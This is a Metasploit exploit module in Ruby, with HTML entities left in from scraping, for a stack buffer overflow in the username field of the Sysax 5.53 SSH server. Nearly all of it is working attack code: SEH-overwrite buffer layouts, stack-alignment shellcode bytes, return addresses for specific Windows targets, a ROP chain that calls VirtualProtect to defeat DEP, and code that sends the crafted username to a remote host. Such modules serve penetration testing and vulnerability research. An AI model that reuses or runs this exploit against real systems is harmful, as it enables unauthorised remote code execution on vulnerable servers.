# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Tcp
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Sysax 5.53 SSH Username Buffer Overflow",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in Sysax&#039;s SSH service.  By
                supplying a long username, the SSH server will copy that data on the stack
                without any proper bounds checking, therefore allowing remote code execution
                (before 5.53) are also affected by this bug.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Craig Freyman&#039;,  #Initial discovery, PoC
                    &#039;sinn3r&#039;          #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;OSVDB&#039;, &#039;79689&#039;],
                    [&#039;URL&#039;, &#039;http://www.pwnag3.com/2012/02/sysax-multi-server-ssh-username-exploit.html&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18535/&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 1024,
                    &#039;BadChars&#039;        => "\x00\x3a",
                    &#039;StackAdjustment&#039; => -3500
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "seh"
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [
                        &#039;Sysax 5.53 on Win XP SP3 / Win2k3 SP0&#039;,
                        {
                            &#039;Rop&#039; => false,
                            &#039;Ret&#039; => 0x00402669  # POP/POP/RET - sysaxservd.exe
                        }
                    ],
                    [
                        &#039;Sysax 5.53 on Win2K3 SP1/SP2&#039;,
                        {
                            &#039;Rop&#039; => true,
                            &#039;Ret&#039; => 0x0046d23c  # ADD ESP, 0F8C # RETN
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Feb 27 2012",
            &#039;DefaultTarget&#039;  => 0))
        register_options(
            [
                OptInt.new(&#039;RPORT&#039;, [false, &#039;The target port&#039;, 22])
            ], self.class)
    end
    def load_netssh
        begin
            require &#039;net/ssh&#039;
            return true
        rescue LoadError
            return false
        end
    end
    def get_regular_exploit
        #
        # Align the stack to the beginning of the fixed size payload
        #
        align  = "\x54"              #PUSH ESP
        align << "\x58"              #POP EAX
        align << "\x04\x08"          #ADD AL,0x08
        align << "\x8b\x18"          #MOV EBX, [EAX]
        align << "\x93"              #XCHG EAX,EBX
        align << "\x66\x2d\x10\x04"  #SUB AX,0x361
        align << "\x50"              #PUSH EAX
        align << "\xc3"              #RET
        #
        # Our payload limited to 1024+4 bytes
        #
        p = make_nops(4)
        p << payload.encoded
        #
        # Craft the buffer like this:
        # [392 bytes][20 bytes][< 9404 bytes][payload][alignment][nseh][seh]
        # * The 20-byte region is where our source IP is written. 20 bytes gives it enough room
        #   for the IP length, so the next 9404-byte space will begin at a consistent place.
        # * After SEH, we have ~1860 bytes, but we don&#039;t need that because we&#039;re doing a
        #   partial-overwrite to allow a null byte in SEH.
        #
        buf  = &#039;&#039;
        buf << rand_text(392, payload_badchars)
        buf << rand_text(20, payload_badchars)
        buf << rand_text(9204-buf.length-align.length-p.length, payload_badchars) #8796+392+20
        buf << p
        buf << align
        buf << "\xeb" + [0-align.length-2].pack(&#039;c&#039;) + make_nops(2) #Short jmp back
        buf << [target.ret].pack(&#039;V*&#039;)
        return buf
    end
    def get_rop_exploit
        junk = rand_text(4).unpack("L")[0].to_i
        nop  = make_nops(4).unpack("L")[0].to_i
        # !mona rop -m msvcrt
        p =
            [
                0x77bb2563, # POP EAX # RETN
                0x77ba1114, # <- *&VirtualProtect()
                0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
                junk,
                0x77bb0c86, # XCHG EAX,ESI # RETN
                0x77bc9801, # POP EBP # RETN
                0x77be2265, # ptr to &#039;push esp #  ret&#039;
                0x77bb2563, # POP EAX # RETN
                0x03C0990F,
                0x77bdd441, # SUB EAX, 03c0940f
                0x77bb48d3, # POP EBX, RET
                0x77bf21e0, # .data
                0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
                0x77bbfc02, # POP ECX # RETN
                0x77bef001, # W pointer (lpOldProtect) (-> ecx)
                0x77bd8c04, # POP EDI # RETN
                0x77bd8c05, # ROP NOP (-> edi)
                0x77bb2563, # POP EAX # RETN
                0x03c0984f,
                0x77bdd441, # SUB EAX, 03c0940f
                0x77bb8285, # XCHG EAX,EDX # RETN
                0x77bb2563, # POP EAX # RETN
                nop,
                0x77be6591, # PUSHAD # ADD AL,0EF # RETN
            ].pack("V*")
        p << payload.encoded
        #
        # Similar buffer structure to get_regular_exploit
        #
        buf  = &#039;&#039;
        buf << rand_text(392, payload_badchars)
        buf << rand_text(20, payload_badchars)
        buf << rand_text(1012, payload_badchars)
        buf << p
        buf << rand_text(9204-buf.length)
        buf << rand_text(4, payload_badchars)
        buf << [target.ret].pack(&#039;V*&#039;)
        return buf
    end
    def exploit
        #
        # Load net/ssh so we can talk the SSH protocol
        #
        has_netssh = load_netssh
        if not has_netssh
            print_error("You don&#039;t have net/ssh installed.  Please run gem install net-ssh")
            return
        end
        #
        # Create buffer based on target (DEP or no DEP)
        #
        if target[&#039;Rop&#039;]
            buf = get_rop_exploit
        else
            buf = get_regular_exploit
        end
        #
        # Send the malicious buffer
        #
        pass = rand_text_alpha(8)
        begin
            print_status("Sending malicious request to #{rhost}:#{rport}...")
            ssh = Net::SSH.start(
                datastore[&#039;RHOST&#039;],
                buf,
                {
                    :password  => pass,
                    :port      => datastore[&#039;RPORT&#039;],
                    :timeout   => 1
                })
            ::Timeout.timeout(1) {ssh.close} rescue nil
        rescue Errno::ECONNREFUSED
            print_error("Cannot establish a connection on #{rhost}:#{rport}")
            return
        rescue ::Exception => e
            if e.message =~ /fingerprint [0-9a-z\:]+ does not match/
                print_error("Please remove #{rhost}:#{rport} from your known_hosts list")
                return
            end
        end
        handler(ssh)
    end
end
=begin
Todo: We seriously need a MSF SSH mixin to handle the SSH protocol ourselves, not
relying on net/ssh.
=end



